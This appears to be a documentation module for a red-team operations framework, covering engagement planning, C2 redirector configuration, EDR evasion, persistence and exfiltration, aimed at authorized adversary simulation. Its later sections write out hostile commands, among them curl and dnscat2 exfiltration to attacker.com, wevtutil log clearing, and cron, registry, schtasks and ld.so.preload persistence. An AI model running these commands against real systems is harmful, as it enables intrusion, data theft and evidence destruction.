---
name: "red-team-operations"
category: "redteam"
version: "1.0.0"
tags: ["redteam", "red-team-operations", "adversary-simulation", "offensive-security"]
---

# Red Team Operations Framework

## Overview

The Red Team Operations module provides a comprehensive framework for conducting full-scope adversary simulation engagements. Unlike traditional penetration testing (which focuses on finding vulnerabilities), red team operations simulate real-world threat actors to test an organization's detection, response, and resilience capabilities. This module covers operational planning, infrastructure management, multi-vector attack execution, defense evasion, persistence, and operational reporting.

Red team operations are fundamentally different from penetration testing:
- **Objective-driven** — focused on achieving specific goals (domain admin, data exfiltration, business impact) rather than finding all vulnerabilities
- **Stealth-focused** — designed to evade detection by the organization's SOC, IR team, and security controls
- **Realistic** — mimics actual threat actor TTPs, not just vulnerability exploitation
- **Detection-evaluated** — measures not just whether attacks succeed, but how quickly and effectively the defense detects and responds

This module provides infrastructure management, OPSEC frameworks, multi-team coordination, and operational planning tools. It is designed for experienced security professionals conducting authorized engagements against mature organizations.

**Authorization is mandatory.** Red team operations involve advanced techniques that can have real-world impact. Only conduct these operations with explicit written authorization and clear rules of engagement.

## Core Capabilities

### 1. Operational Planning & Management
- Objective definition and scope negotiation
- Threat actor selection and TTP mapping
- Operational timeline and milestone planning
- Risk assessment and contingency planning
- Multi-team coordination (external, internal, physical, social engineering)
- Rules of engagement documentation and enforcement

### 2. Infrastructure & OPSEC
- Command and control (C2) infrastructure management
- Redirector and domain fronting setup
- Operational security (OPSEC) frameworks
- Traffic profiling and detection avoidance
- Infrastructure compartmentalization and rotation
- Certificate and SSL/TLS management

### 3. Multi-Vector Attack Execution
- Initial access (phishing, web exploits, supply chain, physical)
- Privilege escalation (local, domain, cloud)
- Lateral movement and pivoting
- Persistence mechanisms
- Defense evasion techniques
- Data collection and exfiltration

### 4. Defense Evasion & Stealth
- EDR/AV evasion techniques
- Network traffic obfuscation
- Log evasion and tampering
- Living-off-the-land techniques
- Anti-forensics and cleanup
- Detection-aware testing (adjusting based on SOC activity)

### 5. Operational Reporting & Metrics
- Attack path documentation
- Detection timeline analysis (dwell time, detection gap)
- MITRE ATT&CK mapping
- Defensive capability assessment
- Executive summary with business impact
- Remediation roadmap with prioritization

## Usage Examples

### Plan a Red Team Engagement

```python
from red_team_operations import RedTeamEngagement, Objective, ThreatActorProfile

# Define engagement objectives
objectives = [
    Objective(
        name="Domain Administrative Access",
        description="Gain domain administrative privileges on the corporate network",
        priority="critical",
        success_criteria="Domain Admin account compromised, DC accessed",
        time_limit_days=30,
    ),
    Objective(
        name="Data Exfiltration",
        description="Exfiltrate sensitive data simulating a real breach",
        priority="high",
        success_criteria="100MB of simulated PII exfiltrated past DLP controls",
        time_limit_days=45,
        depends_on="Domain Administrative Access",
    ),
    Objective(
        name="Business Impact Demonstration",
        description="Demonstrate ability to disrupt business operations",
        priority="medium",
        success_criteria="Access to critical business system confirmed",
        time_limit_days=60,
        depends_on="Domain Administrative Access",
    ),
]

# Select threat actor profile
threat_actor = ThreatActorProfile(
    name="FIN7-inspired",
    motivation="financial",
    sophistication="advanced",
    ttps=[
        "T1566.001",  # Spearphishing Attachment
        "T1059.001",  # PowerShell
        "T1021.002",  # SMB/Windows Admin Shares
        "T1003.001",  # LSASS Memory
        "T1053.005",  # Scheduled Task
        "T1041",      # Exfiltration Over C2 Channel
    ],
    tools=["cobalt_strike", "mythic", "sliver"],
    infrastructure_preferences=["redirector", "domain_fronting"],
)

# Create engagement
engagement = RedTeamEngagement(
    name="ACME Corp Red Team Assessment",
    client="ACME Corporation",
    authorization="./auth/acme_redteam_auth.pdf",
    objectives=objectives,
    threat_actor=threat_actor,
    scope={
        "in_scope": ["*.acme.com", "10.0.0.0/8", "acme physical offices"],
        "out_of_scope": ["production databases", "scada systems"],
        "testing_hours": "24/7",
        "notification_required": False,
        "emergency_stop": "+1-555-0199",
    },
    start_date="2024-01-15",
    end_date="2024-03-15",
    team_size=4,
    budget=150000,
)
```

### Deploy Red Team Infrastructure

```python
from red_team_operations import Infrastructure, C2Server, Redirector, Domain

# Define infrastructure components
infra = Infrastructure(
    name="ACME Red Team Infrastructure",
    engagement=engagement,
    components=[
        C2Server(
            type="cobalt_strike",
            host="c2-01.redteam.example.com",
            port=443,
            protocol="https",
            profile="malleable_c2_profile",
            teamserver_password="encrypted_password",
            encryption="aes-256-gcm",
        ),
        Redirector(
            type="nginx",
            host="redirector-01.redteam.example.com",
            port=443,
            upstream="c2-01.redteam.example.com:443",
            ssl_cert="letsencrypt",
            rate_limiting=True,
            ip_filtering=["client_ip_range"],
        ),
        Domain(
            name="acme-corp.net",
            registrar="cloudflare",
            dns_provider="cloudflare",
            records=[
                {"type": "A", "name": "@", "value": "redirector-01.redteam.example.com"},
                {"type": "A", "name": "www", "value": "redirector-01.redteam.example.com"},
                {"type": "MX", "name": "@", "value": "mail.acme-corp.net"},
            ],
        ),
    ],
    compartmentalization="full",  # each team member gets separate infra
    rotation_schedule="weekly",
    cleanup_on_compromise=True,
)

# Deploy and verify
infra.deploy()
infra.verify()
infra.monitor(status_check_interval=300)
```

### Execute Attack Chain

```python
from red_team_operations import AttackChain, AttackPhase, AttackResult

# Create attack chain
attack_chain = AttackChain(engagement)

# Phase 1: Initial Access
phase1 = AttackPhase(
    name="Initial Access",
    techniques=["T1566.001"],  # Spearphishing Attachment
    vector="phishing",
    payload="macro_document_with_c2",
    targets=["finance@acme.com", "hr@acme.com"],
    opsec_requirements=[
        "use_lookalike_domain",
        "avoid_known_bad_ip_ranges",
        "mimic_ legitimate_email_patterns",
    ],
)

result1 = attack_chain.execute(phase1)
print(f"Initial access: {'Success' if result1.success else 'Failed'}")
print(f"Detection: {result1.detected}")

# Phase 2: Execution and Persistence
phase2 = AttackPhase(
    name="Execution & Persistence",
    techniques=["T1059.001", "T1053.005"],  # PowerShell, Scheduled Task
    parent=result1,
    opsec_requirements=[
        "living_off_the_land",
        "minimize_new_artifacts",
        "blend_with_normal_traffic",
    ],
)

result2 = attack_chain.execute(phase2)

# Phase 3: Privilege Escalation
phase3 = AttackPhase(
    name="Privilege Escalation",
    techniques=["T1003.001", "T1068"],  # LSASS, Exploitation for Priv Esc
    parent=result2,
    opsec_requirements=[
        "target_high_value_accounts",
        "minimize_noise",
        "use_valid_credentials",
    ],
)

result3 = attack_chain.execute(phase3)

# Phase 4: Lateral Movement
phase4 = AttackPhase(
    name="Lateral Movement",
    techniques=["T1021.002", "T1572"],  # SMB, Protocol Tunneling
    parent=result3,
    target_network="10.0.0.0/16",
    opsec_requirements=[
        "use_compromised_credentials",
        "avoid_failed_auth_spikes",
        "respect_business_hours",
    ],
)

result4 = attack_chain.execute(phase4)

# Phase 5: Objective Completion
phase5 = AttackPhase(
    name="Data Exfiltration",
    techniques=["T1041", "T1048"],  # Exfil Over C2, Exfil Over Alt Protocol
    parent=result4,
    objective="Data Exfiltration",
    data_volume_mb=100,
    opsec_requirements=[
        "encrypt_exfil_data",
        "use_legitimate_services",
        "limit_bandwidth",
    ],
)

result5 = attack_chain.execute(phase5)
```

### Monitor and Coordinate Operations

```python
from red_team_operations import OperationalDashboard, TeamMember, SituationReport

# Set up operational dashboard
dashboard = OperationalDashboard(engagement)

# Track team activities
team = [
    TeamMember(
        name="Operator 1",
        role="external_access",
        infrastructure="external_c2",
        active_sessions=["session_001"],
        current_phase="Lateral Movement",
    ),
    TeamMember(
        name="Operator 2",
        role="social_engineering",
        infrastructure="phishing_infra",
        campaigns=["q1_phishing"],
        current_phase="Credential Harvesting",
    ),
    TeamMember(
        name="Operator 3",
        role="physical_access",
        infrastructure="badge_cloner",
        activities=["tailgating", "usb_drops"],
        current_phase="Physical Reconnaissance",
    ),
]

dashboard.register_team(team)
dashboard.start_monitoring()

# Generate situation report
sitrep = SituationReport(
    engagement=engagement,
    dashboard=dashboard,
    period="daily",
)

report = sitrep.generate()
print(f"\n=== Situation Report ===")
print(f"Period: {report.period}")
print(f"Active operators: {report.active_operators}")
print(f"Compromised hosts: {report.compromised_hosts}")
print(f"Objectives completed: {report.objectives_completed}/{report.objectives_total}")
print(f"Detection events: {report.detection_events}")
print(f"OPSEC incidents: {report.opsec_incidents}")
```

### Generate Operational Report

```python
from red_team_operations import OperationalReport, Finding, DetectionAnalysis

# Compile findings
findings = [
    Finding(
        title="Phishing-led Domain Admin Compromise",
        severity="critical",
        objective="Domain Administrative Access",
        attack_path=[
            "T1566.001 - Spearphishing with macro document",
            "T1059.001 - PowerShell execution",
            "T1003.001 - LSASS credential dumping",
            "T1021.002 - Lateral movement via SMB",
            "T1003.003 - DCSync for domain admin",
        ],
        detection_timeline={
            "initial_access": "Not detected",
            "execution": "Not detected",
            "privilege_escalation": "Not detected",
            "lateral_movement": "Detected after 14 days",
            "objective_completion": "Detected after 21 days",
        },
        dwell_time_days=21,
        business_impact="Full domain compromise, access to all systems and data",
        evidence_path="./evidence/finding_001/",
    ),
]

# Generate report
report = OperationalReport(
    engagement=engagement,
    findings=findings,
    detection_analysis=DetectionAnalysis(
        soc_response_time="14 days for lateral movement detection",
        ir_capabilities="Limited - no automated response for credential theft",
        monitoring_gaps=[
            "No LSASS access monitoring",
            "No DCSync detection",
            "Limited PowerShell logging",
        ],
    ),
    mitre_mapping=True,
    executive_summary=True,
    technical_details=True,
    remediation_roadmap=True,
)

report.generate(
    format="docx",
    output_path="./reports/acme_redteam_report.docx",
    classification="CONFIDENTIAL",
    distribution=["CISO", "Security Team", "Board"],
)
```

## Best Practices

### Operational Discipline
1. **Never compromise the client.** Red team operations must not cause real damage. Use controlled payloads and avoid destructive techniques unless explicitly authorized.
2. **Maintain OPSEC at all times.** Every action should be invisible to the defensive team. If you're detected, you lose the ability to test detection capabilities.
3. **Coordinate with the white team.** Have clear communication channels for emergency stops, scope questions, and critical findings.
4. **Document everything.** Every action, decision, and outcome should be logged for the operational report.

### Infrastructure Management
1. **Compartmentalize infrastructure.** Each team member should have separate C2 infrastructure to prevent cross-contamination.
2. **Use redirectors and domain fronting.** Never connect directly to team servers from target networks.
3. **Rotate infrastructure regularly.** If any component is suspected of compromise, rotate immediately.
4. **Monitor your infrastructure.** Track connections, anomalies, and potential counter-detection by the SOC.

### Attack Execution
1. **Follow the threat actor profile.** Your techniques should reflect the selected threat actor's TTPs, not random exploitation.
2. **Be patient.** Real adversaries operate over weeks and months, not hours. Rushing increases detection risk.
3. **Adapt to the environment.** If initial techniques are blocked or detected, pivot to alternatives that fit the threat actor profile.
4. **Respect business operations.** Avoid disrupting critical business processes unless explicitly authorized.

### Reporting
1. **Focus on detection gaps.** The primary value of a red team is identifying what the defense doesn't see.
2. **Map to MITRE ATT&CK.** Use the framework to structure findings and enable comparison with threat intelligence.
3. **Provide actionable remediation.** Every finding should include specific, prioritized steps to improve detection and response.
4. **Quantify risk.** Use metrics like dwell time, detection coverage, and response time to communicate risk to executives.

## Related Modules

- **penetration-testing** — Technical vulnerability assessment and exploitation
- **adversary-emulation** — Threat actor TTP implementation and mapping
- **social-engineering** — Human-factor testing and phishing campaigns
- **exploit-development** — Custom exploit development for authorized testing
- **redteam-mindset** — Operational discipline and mindset for red team operators
- **mid-engagement-ir-detection** — Detecting defensive changes during operations
- **redteam-report-template** — Client-facing red team report structure

---

## Advanced Red Team Operations Topics

### OPSEC Framework and Principles

Operational Security is the cornerstone of red team operations. Every action must be evaluated against the probability of detection and the impact of being discovered.

```python
class OPSECFramework:
    """Operational Security framework for red team operations"""

    OPSEC_PRINCIPLES = {
        "minimize_footprint": {
            "description": "Leave as few artifacts as possible on target systems",
            "guidelines": [
                "Use in-memory execution where possible",
                "Clean up all dropped files after use",
                "Avoid creating new services or scheduled tasks when possible",
                "Use existing tools already present on the system",
                "Minimize network connections to external infrastructure",
            ],
        },
        "blend_with_normal": {
            "description": "Make malicious activity look like legitimate operations",
            "guidelines": [
                "Use legitimate tools and protocols (living off the land)",
                "Mimic normal user and admin behavior patterns",
                "Operate during business hours when possible",
                "Use existing authentication tokens and sessions",
                "Match network traffic patterns to baseline",
            ],
        },
        "compartmentalize": {
            "description": "Isolate activities to prevent cross-contamination",
            "guidelines": [
                "Use separate infrastructure for each attack vector",
                "Don't mix personal and operational infrastructure",
                "Use unique credentials for each access path",
                "Isolate findings and evidence by attack vector",
                "Use separate workspaces for each operator",
            ],
        },
        "monitor_detection": {
            "description": "Monitor for signs of defensive detection",
            "guidelines": [
                "Watch for new firewall rules or IPS alerts",
                "Monitor for changes in network traffic patterns",
                "Watch for IR team activity on compromised hosts",
                "Monitor for new EDR agents or scanning activity",
                "Track SIEM alert volumes for anomalies",
            ],
        },
    }

    def evaluate_action(self, action):
        """Evaluate an action against OPSEC principles"""
        risks = []
        mitigations = []

        # Check for common OPSEC violations
        if action.get("creates_file"):
            risks.append("File artifact on disk")
            mitigations.append("Use in-memory execution or clean up immediately")

        if action.get("connects_external"):
            risks.append("External network connection")
            mitigations.append("Use redirectors and domain fronting")

        if action.get("uses_known_tool"):
            risks.append("Known offensive tool detection")
            mitigations.append("Rename tools or use LOLBins")

        if action.get("runs_new_process"):
            risks.append("New process creation logged")
            mitigations.append("Inject into existing processes")

        if action.get("modifies_registry"):
            risks.append("Registry modification detected")
            mitigations.append("Use memory-only persistence")

        return {
            "action": action.get("name"),
            "risk_level": self._calculate_risk(risks),
            "risks": risks,
            "mitigations": mitigations,
            "recommendation": "proceed" if len(risks) < 3 else "review",
        }

    def _calculate_risk(self, risks):
        """Calculate risk level from identified risks"""
        if len(risks) >= 5:
            return "critical"
        elif len(risks) >= 3:
            return "high"
        elif len(risks) >= 1:
            return "medium"
        return "low"
```

### C2 Infrastructure Architecture

```python
class C2Infrastructure:
    """Command and Control infrastructure management"""

    def __init__(self):
        self.components = {
            "teamserver": None,
            "redirectors": [],
            "listeners": [],
            "domains": [],
            "ssl_certs": [],
        }

    def design_architecture(self, engagement):
        """Design C2 infrastructure architecture"""
        architecture = {
            "layer_1_external": {
                "description": "Internet-facing components",
                "components": [
                    {
                        "type": "Domain Fronting CDN",
                        "purpose": "Hide C2 destination behind legitimate CDN",
                        "provider": "Cloudflare / Fastly / Azure Front Door",
                        "configuration": {
                            "frontend_domain": "legitimate-looking.com",
                            "backend_domain": "c2-server.internal",
                            "ssl_termination": "CDN handles SSL",
                            "cache_rules": "Bypass cache for C2 traffic",
                        },
                    },
                    {
                        "type": "Redirector",
                        "purpose": "Relay traffic and filter unauthorized access",
                        "configuration": {
                            "software": "nginx or HAProxy",
                            "ssl_cert": "Let's Encrypt or commercial",
                            "ip_filtering": "Allow only client IP ranges",
                            "rate_limiting": "Prevent enumeration",
                            "logging": "Log all connections for monitoring",
                        },
                    },
                ],
            },
            "layer_2_dmz": {
                "description": "DMZ or cloud-hosted components",
                "components": [
                    {
                        "type": "C2 Server",
                        "purpose": "Run teamserver (Cobalt Strike, Mythic, Sliver)",
                        "hosting": "Cloud VPS (AWS, Azure, DigitalOcean)",
                        "configuration": {
                            "firewall": "Only accept from redirectors",
                            "encryption": "TLS 1.3 for all traffic",
                            "monitoring": "Monitor for counter-detection",
                            "backup": "Snapshot and backup regularly",
                        },
                    },
                ],
            },
            "layer_3_internal": {
                "description": "Compromised internal network access",
                "components": [
                    {
                        "type": "Implant",
                        "purpose": "Execute on target systems",
                        "configuration": {
                            "sleep_time": "Randomized (30-120 seconds)",
                            "jitter": "25-50% randomization",
                            "communication": "HTTPS through redirectors",
                            "evasion": "In-memory execution, process injection",
                        },
                    },
                ],
            },
        }
        return architecture

    def deploy_redirector(self, config):
        """Deploy an nginx redirector"""
        nginx_config = f"""
# Red Team Redirector - {config['name']}
# Generated for engagement: {config['engagement']}

worker_processes auto;
pid /run/nginx.pid;

events {{
    worker_connections 1024;
    multi_accept on;
    use epoll;
}}

http {{
    # Basic settings
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    # Logging - minimal to avoid detection
    access_log /var/log/nginx/access.log combined buffer=512k flush=1m;
    error_log /var/log/nginx/error.log warn;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=redirect:10m rate=10r/s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {{
        listen 443 ssl http2;
        server_name {config['domain']};

        ssl_certificate /etc/letsencrypt/live/{config['domain']}/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/{config['domain']}/privkey.pem;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
        ssl_prefer_server_ciphers off;

        # IP filtering - only allow client IPs
        allow {config['client_ip_range']};
        deny all;

        # Rate limiting
        limit_req zone=redirect burst=20 nodelay;
        limit_conn addr 10;

        # Redirect to C2 server
        location / {{
            proxy_pass https://{config['c2_server']};
            proxy_set_header Host {config['c2_server']};
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # Hide redirector identity
            proxy_hide_header Server;
            proxy_hide_header X-Powered-By;

            # Buffer settings
            proxy_buffering on;
            proxy_buffer_size 128k;
            proxy_buffers 4 256k;
        }}

        # Deceptive locations
        location /robots.txt {{
            return 200 "User-agent: *\\nDisallow: /\\n";
        }}

        location /.well-known/security.txt {{
            return 200 "{{\\"contact\\": \\"security@example.com\\", \\"policy\\": \\"https://example.com/security\\"}}";
            add_header Content-Type application/json;
        }}

        # Block common scanners
        location ~* (\\.env|\\.git|wp-admin|phpmyadmin) {{
            return 404;
        }}
    }}

    # HTTP to HTTPS redirect
    server {{
        listen 80;
        server_name {config['domain']};
        return 301 https://$host$request_uri;
    }}
}}
"""
        return nginx_config
```

### Evasion Techniques and Defense Bypass

```python
class EvasionTechniques:
    """Defense evasion techniques for red team operations"""

    def edr_evasion(self):
        """Endpoint Detection and Response evasion"""
        techniques = {
            "process_injection": {
                "description": "Inject into legitimate running processes",
                "methods": [
                    "Classic DLL injection (CreateRemoteThread)",
                    "Process hollowing (RunPE)",
                    "Atom bombing",
                    "Thread execution hijacking",
                    "Early Bird injection",
                ],
                "detection_indicators": [
                    "New threads in legitimate processes",
                    "Memory allocations with RWX permissions",
                    "Unusual module loads in system processes",
                ],
            },
            "living_off_the_land": {
                "description": "Use built-in system tools for malicious purposes",
                "tools": [
                    "PowerShell (encoded commands, AMSI bypass)",
                    "WMI (remote execution, persistence)",
                    "certutil (download files)",
                    "mshta (execute HTA payloads)",
                    "regsvr32 (execute DLLs)",
                    "rundll32 (execute DLL exports)",
                    "msbuild (compile and execute inline C#)",
                ],
            },
            "amsi_bypass": {
                "description": "Bypass Antimalware Scan Interface",
                "techniques": [
                    "AMSI reflection patching in memory",
                    "Base64 encoding of PowerShell commands",
                    "Using .NET assembly loading instead of PowerShell",
                    "Environment variable modification",
                ],
            },
            "etw_patching": {
                "description": "Patch Event Tracing for Windows to prevent logging",
                "techniques": [
                    "NtTraceEvent patching",
                    "ETW provider disabling",
                    "Event log service manipulation",
                ],
            },
            "unhooking": {
                "description": "Remove EDR userland hooks from processes",
                "techniques": [
                    "NtProtectVirtualMemory to make pages executable",
                    "Fresh DLL loading from disk",
                    "Manual mapping of clean DLLs",
                ],
            },
        }
        return techniques

    def network_evasion(self):
        """Network-based detection evasion"""
        techniques = {
            "traffic_encryption": {
                "description": "Encrypt all C2 traffic",
                "methods": [
                    "TLS 1.3 with legitimate certificates",
                    "Custom encryption layer on top of HTTPS",
                    "Steganography in image uploads",
                ],
            },
            "protocol_mimicry": {
                "description": "Make C2 traffic look like legitimate protocols",
                "methods": [
                    "DNS tunneling for data exfiltration",
                    "HTTP traffic mimicking browser patterns",
                    "WebSocket connections to legitimate services",
                    "Cloud service API abuse (Slack, GitHub, Dropbox)",
                ],
            },
            "domain_fronting": {
                "description": "Use CDN infrastructure to hide C2 destination",
                "implementation": "Configure Host header to differ from SNI",
            },
            "traffic_shaping": {
                "description": "Shape traffic to match normal patterns",
                "techniques": [
                    "Randomized sleep intervals",
                    "Bandwidth limiting to match normal usage",
                    "Jitter in beacon timing",
                    "Mimicking browser request patterns",
                ],
            },
        }
        return techniques

    def log_evasion(self):
        """Log and evidence evasion techniques"""
        techniques = {
            "timestomp": {
                "description": "Modify file timestamps to blend with system files",
                "tools": "timestomp, SetFileTime API",
            },
            "log_cleared": {
                "description": "Clear or modify security logs",
                "techniques": [
                    "wevtutil cl Security",
                    "wevtutil cl System",
                    "PowerShell: Clear-EventLog",
                ],
                "detection": "Log gap detection, Event ID 1102",
            },
            "artifact_cleanup": {
                "description": "Remove all artifacts from compromised systems",
                "checklist": [
                    "Remove dropped files",
                    "Remove scheduled tasks",
                    "Remove registry modifications",
                    "Restore modified configurations",
                    "Clear temp directories",
                ],
            },
        }
        return techniques
```

### Persistence Mechanisms

```python
class PersistenceMechanisms:
    """Red team persistence mechanisms for authorized engagements"""

    def windows_persistence(self):
        """Windows-based persistence techniques"""
        techniques = {
            "registry_run_key": {
                "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f',
                "detection": "Sysmon Event ID 12 (Registry Event)",
                "cleanup": "reg delete the key",
            },
            "scheduled_task": {
                "command": 'schtasks /create /tn "SystemCheck" /tr "powershell -enc <payload>" /sc ONLOGON /ru SYSTEM',
                "detection": "Sysmon Event ID 1 (Process Create) + schtasks creation",
                "cleanup": 'schtasks /delete /tn "SystemCheck" /f',
            },
            "wmi_event_subscription": {
                "command": 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="SystemFilter",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
                "detection": "Sysmon Event ID 19 (WMI Event)",
                "cleanup": "Remove WMI subscription",
            },
            "startup_folder": {
                "location": "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "detection": "File creation in startup folder",
                "cleanup": "Delete file from startup folder",
            },
            "service_creation": {
                "command": 'sc create "UpdateService" binPath= "C:\\payload.exe" start= auto',
                "detection": "Event ID 7045 (New service installed)",
                "cleanup": 'sc delete "UpdateService"',
            },
            "dll_side_loading": {
                "description": "Place malicious DLL in application search path",
                "detection": "Module load from unusual path",
                "cleanup": "Remove planted DLL",
            },
        }
        return techniques

    def linux_persistence(self):
        """Linux-based persistence techniques"""
        techniques = {
            "crontab": {
                "command": "echo '* * * * * /tmp/.hidden/payload' | crontab -",
                "detection": "Cron job creation logging",
                "cleanup": "Remove crontab entry",
            },
            "ssh_keys": {
                "command": "echo '<public_key>' >> ~/.ssh/authorized_keys",
                "detection": "SSH key addition logging",
                "cleanup": "Remove added key",
            },
            "systemd_service": {
                "command": "Create /etc/systemd/system/update.service",
                "detection": "Systemd unit creation logging",
                "cleanup": "Remove service file and disable",
            },
            "bash_profile": {
                "command": "echo '/tmp/.hidden/payload' >> ~/.bashrc",
                "detection": "Shell profile modification",
                "cleanup": "Remove added line",
            },
            "ld_preload": {
                "command": "echo '/tmp/.hidden/evil.so' >> /etc/ld.so.preload",
                "detection": "LD_PRELOAD modification",
                "cleanup": "Remove from ld.so.preload",
            },
        }
        return techniques
```

### Data Exfiltration Simulation

```python
class ExfiltrationSimulation:
    """Simulate data exfiltration for red team operations"""

    def exfiltration_methods(self):
        """Various exfiltration techniques"""
        methods = {
            "dns_tunneling": {
                "description": "Exfiltrate data encoded in DNS queries",
                "tools": ["dnscat2", "iodine", "dns2tcp"],
                "detection": [
                    "High volume of DNS queries",
                    "Unusual TXT record sizes",
                    "DNS queries to newly registered domains",
                    "Anomalous DNS query patterns",
                ],
                "example": "dnscat2 server --dnsdomain tunnel.attacker.com",
            },
            "https_exfil": {
                "description": "Exfiltrate data over HTTPS to cloud services",
                "tools": ["curl", "wget", "custom scripts"],
                "detection": [
                    "Unusual outbound HTTPS traffic volumes",
                    "Connections to cloud storage services",
                    "Data upload patterns in network logs",
                ],
                "example": "curl -X POST -d @data.txt https://attacker.com/upload",
            },
            "icmp_exfil": {
                "description": "Exfiltrate data in ICMP echo request payloads",
                "tools": ["custom scripts", "ptunnel"],
                "detection": [
                    "ICMP packets with unusual payload sizes",
                    "ICMP traffic to external hosts",
                    "Non-standard ICMP patterns",
                ],
            },
            "steganography": {
                "description": "Hide data within image or audio files",
                "tools": ["steghide", "OpenStego", "custom tools"],
                "detection": [
                    "File size anomalies in images",
                    "Statistical analysis of image data",
                    "Unusual image download patterns",
                ],
            },
            "cloud_storage": {
                "description": "Upload to legitimate cloud storage services",
                "services": ["Google Drive", "Dropbox", "OneDrive", "S3"],
                "detection": [
                    "Unusual cloud service API usage",
                    "Large file uploads to personal accounts",
                    "Cloud sync client installations",
                ],
            },
            "physical_exfil": {
                "description": "Exfiltrate via physical media or network",
                "methods": [
                    "USB drive",
                    "Email attachment to personal account",
                    "Bluetooth transfer",
                    "QR code capture",
                ],
                "detection": [
                    "USB device connection events",
                    "Email forwarding rules",
                    "Bluetooth device pairing",
                ],
            },
        }
        return methods

    def simulate_data_staging(self, target_data_type="PII"):
        """Simulate data staging for exfiltration"""
        staging_plan = {
            "identification": "Locate target data (database, file shares, email)",
            "collection": "Copy target data to staging location",
            "compression": "Compress collected data to reduce exfil size",
            "encryption": "Encrypt staged data before exfiltration",
            "exfiltration": "Transfer encrypted data via selected method",
            "cleanup": "Remove all staging artifacts",
        }
        return staging_plan
```

### Operational Reporting and Metrics

```python
class RedTeamMetrics:
    """Track and report red team operational metrics"""

    def calculate_engagement_metrics(self, results):
        """Calculate comprehensive engagement metrics"""
        metrics = {
            "access_metrics": {
                "initial_access_time": self._calculate_time_to_access(results),
                "privilege_escalation_time": self._calculate_time_to_privesc(results),
                "domain_admin_time": self._calculate_time_to_da(results),
                "objective_completion_time": self._calculate_time_to_objective(results),
            },
            "detection_metrics": {
                "detection_rate": self._calculate_detection_rate(results),
                "mean_time_to_detect": self._calculate_mttc(results),
                "detection_gaps": self._identify_detection_gaps(results),
                "false_negatives": self._count_false_negatives(results),
            },
            "coverage_metrics": {
                "techniques_attempted": self._count_techniques(results),
                "techniques_detected": self._count_detected_techniques(results),
                "tactics_covered": self._count_tactics(results),
                "coverage_by_tactic": self._coverage_by_tactic(results),
            },
            "impact_metrics": {
                "data_accessible": self._assess_data_access(results),
                "systems_compromised": self._count_systems(results),
                "accounts_compromised": self._count_accounts(results),
                "business_impact": self._assess_business_impact(results),
            },
        }
        return metrics

    def generate_detection_timeline(self, results):
        """Generate detailed detection timeline"""
        timeline = []
        for result in results:
            timeline.append({
                "timestamp": result.timestamp,
                "technique": result.technique_id,
                "technique_name": result.technique_name,
                "tactic": result.tactic,
                "detected": result.detected,
                "detection_method": result.detection_method,
                "detection_time": result.detection_time,
                "response_action": result.response_action,
            })

        # Sort by timestamp
        timeline.sort(key=lambda x: x["timestamp"])
        return timeline

    def generate_attack_narrative(self, results):
        """Generate narrative description of the attack chain"""
        narrative = {
            "timeline_summary": "",
            "key_decisions": [],
            "critical_moments": [],
            "detection_analysis": "",
            "lessons_learned": [],
        }

        # Build narrative from results
        for result in results:
            if result.success and not result.detected:
                narrative["critical_moments"].append(
                    f"Undetected: {result.technique_name} at {result.timestamp}"
                )

        return narrative
```

### Team Coordination and Communication

```python
class TeamCoordination:
    """Coordinate red team operations across multiple operators"""

    def __init__(self, engagement):
        self.engagement = engagement
        self.team_channels = {}
        self.situation_reports = []

    def setup_communication_channels(self):
        """Set up secure communication channels"""
        channels = {
            "primary": {
                "type": "Encrypted messaging (Signal/Keybase)",
                "purpose": "Real-time operational coordination",
                "access": "All team members",
            },
            "tactical": {
                "type": "Secure chat (Element/Matrix)",
                "purpose": "Technical discussion and coordination",
                "access": "Operators",
            },
            "emergency": {
                "type": "Phone call chain",
                "purpose": "Emergency stop and critical incidents",
                "access": "Team lead and client POC",
            },
            "documentation": {
                "type": "Encrypted wiki (Outline/BookStack)",
                "purpose": "Finding documentation and evidence",
                "access": "All team members",
            },
        }
        return channels

    def generate_sitrep(self, period="daily"):
        """Generate situation report"""
        sitrep = {
            "period": period,
            "date": "2024-01-25",
            "executive_summary": "",
            "objectives_status": {
                "completed": [],
                "in_progress": [],
                "blocked": [],
            },
            "active_operations": [],
            "detection_events": [],
            "opsec_incidents": [],
            "plan_next_24h": [],
            "risks_and_issues": [],
        }
        return sitrep

    def coordinate_multi_vector(self, vectors):
        """Coordinate multiple attack vectors simultaneously"""
        coordination = {
            "vector_sync": "Ensure vectors don't interfere with each other",
            "timing": "Coordinate timing of simultaneous actions",
            "infrastructure": "Separate infrastructure per vector",
            "evidence": "Tag evidence by vector for clear attribution",
            "cleanup": "Coordinate cleanup to avoid cross-contamination",
        }
        return coordination
```
